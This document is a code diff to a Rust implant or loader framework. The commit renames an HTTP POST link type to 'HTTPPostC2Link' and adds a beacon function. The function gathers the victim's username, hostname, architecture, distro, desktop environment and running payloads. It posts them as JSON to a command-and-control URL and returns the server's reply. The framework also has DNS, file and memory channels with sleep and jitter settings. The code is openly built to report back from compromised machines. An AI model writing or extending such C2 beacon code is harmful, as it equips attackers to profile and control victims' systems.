@@ -12,7 +12,6 @@ use std::{thread, time};
 
 use crate::config::Config;
 
-use std::collections::HashMap;
 use std::fs;
 use std::time::Duration;
 
@@ -29,7 +28,7 @@ pub enum Link {
     DNS(DNSLink),
     FILE(FileLink),
     MEMORY(MemoryLink),
-    HTTPost(HTTPPostLink),
+    HTTPPostC2(HTTPPostC2Link),
 }
 impl Link {
     pub fn print_link_compact(&self) {
@@ -127,7 +126,7 @@ pub struct MemoryLink {
 }
 
 #[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
-pub struct HTTPPostLink {
+pub struct HTTPPostC2Link {
     pub url: String,
     pub dataoperation: Vec<DataOperation>,
     pub dataoperation_post: Vec<DataOperation>,
@@ -189,7 +188,7 @@ impl LinkFetch for Link {
             Link::DNS(link) => link.download_data(),
             Link::FILE(link) => link.download_data(),
             Link::MEMORY(link) => link.download_data(),
-            Link::HTTPost(link) => link.download_data(),
+            Link::HTTPPostC2(link) => link.download_data(),
         }
     }
 
@@ -200,7 +199,7 @@ impl LinkFetch for Link {
             Link::DNS(link) => link.download_data(),
             Link::FILE(link) => link.download_data(),
             Link::MEMORY(link) => link.download_data(),
-            Link::HTTPost(link) => link.fetch_data_with_post(session_id,running_thread,config),
+            Link::HTTPPostC2(link) => link.fetch_data_with_post(session_id,running_thread,config),
         }
     }
 
@@ -210,7 +209,7 @@ impl LinkFetch for Link {
             Link::DNS(link) => link.get_target(),
             Link::FILE(link) => link.get_target(),
             Link::MEMORY(link) => link.get_target(),
-            Link::HTTPost(link) => link.get_target(),
+            Link::HTTPPostC2(link) => link.get_target(),
         }
     }
     fn get_dataoperation(&self) -> Vec<DataOperation> {
@@ -219,7 +218,7 @@ impl LinkFetch for Link {
             Link::DNS(link) => link.get_dataoperation(),
             Link::FILE(link) => link.get_dataoperation(),
             Link::MEMORY(link) => link.get_dataoperation(),
-            Link::HTTPost(link) => link.get_dataoperation(),
+            Link::HTTPPostC2(link) => link.get_dataoperation(),
         }
     }
 
@@ -229,7 +228,7 @@ impl LinkFetch for Link {
             Link::DNS(link) => link.get_sleep(),
             Link::FILE(link) => link.get_sleep(),
             Link::MEMORY(link) => link.get_sleep(),
-            Link::HTTPost(link) => link.get_sleep(),
+            Link::HTTPPostC2(link) => link.get_sleep(),
         }
     }
     fn get_jitt(&self) -> u64 {
@@ -238,7 +237,7 @@ impl LinkFetch for Link {
             Link::DNS(link) => link.get_jitt(),
             Link::FILE(link) => link.get_jitt(),
             Link::MEMORY(link) => link.get_jitt(),
-            Link::HTTPost(link) => link.get_jitt(),
+            Link::HTTPPostC2(link) => link.get_jitt(),
         }
     }
 }
@@ -407,11 +406,65 @@ impl LinkFetch for HTTPLink {
     }
 }
 
-impl LinkFetch for HTTPPostLink {
+
+#[derive(Serialize, Deserialize, Debug, PartialEq, Clone)]
+pub struct PostToC2 {
+    pub session_id: String,
+    pub username: String,
+    pub hostname: String,
+    pub arch: String,
+    pub distro: String,
+    pub desktop_env: String,
+    //pub running_thread: Vec<String>,
+    pub running_thread: Vec<Payload>,
+    //pub config: String,
+    //pub loader_name: String,
+    //pub working_link: String,
+}
+
+
+impl LinkFetch for HTTPPostC2Link {
     fn download_data(&self) -> Result<Vec<u8>, anyhow::Error> {
         todo!()
     }
+    fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
+    ) -> Result<Vec<u8>, anyhow::Error> {
 
+        let mut tt=vec![];
+        for i in running_thread{
+            tt.push(i.string_payload_compact());
+        }
+
+        let yolo: PostToC2 = PostToC2{
+            session_id: session_id.to_string(),
+            username: whoami::username(),
+            hostname: whoami::devicename(),
+            arch: whoami::arch().to_string(),
+            distro: whoami::distro(),
+            desktop_env: whoami::desktop_env().to_string(),
+            running_thread: running_thread.clone(),
+            //running_thread: tt,
+                };
+
+        // TODO reflechir. est-ce qu'on envoit la config ?? c'est lourd et il faudrait la chiffrer a fond
+        //map.insert("config", format!("{:?}", config));
+        // TODO, il faudrait l'extraire de la config, on pourrait ajouter un nom a chaque config
+        //map.insert("loader", "todo".to_string());
+        //TODO send real data
+        //map.insert("working-link", "todo".to_string());
+
+        let client = reqwest::blocking::Client::builder()
+            .timeout(Duration::from_secs(TIMEOUT))
+            .user_agent(USER_AGENT)
+            .build()?;
+
+        let mut res = client.post(&self.get_target()).json(&yolo).send()?;
+        let mut body: Vec<u8> = Vec::new();
+        res.read_to_end(&mut body)?;
+        Ok(body)
+    }
+
+    /* 
     fn download_data_post(&self,session_id: &String,running_thread: &Vec<Payload>, config:&Config
     ) -> Result<Vec<u8>, anyhow::Error> {
         let mut map: HashMap<&str, String> = HashMap::new();
@@ -441,7 +494,7 @@ impl LinkFetch for HTTPPostLink {
         res.read_to_end(&mut body)?;
         Ok(body)
     }
-
+    */
     fn get_target(&self) -> String {
         format!("{}", self.url)
     }
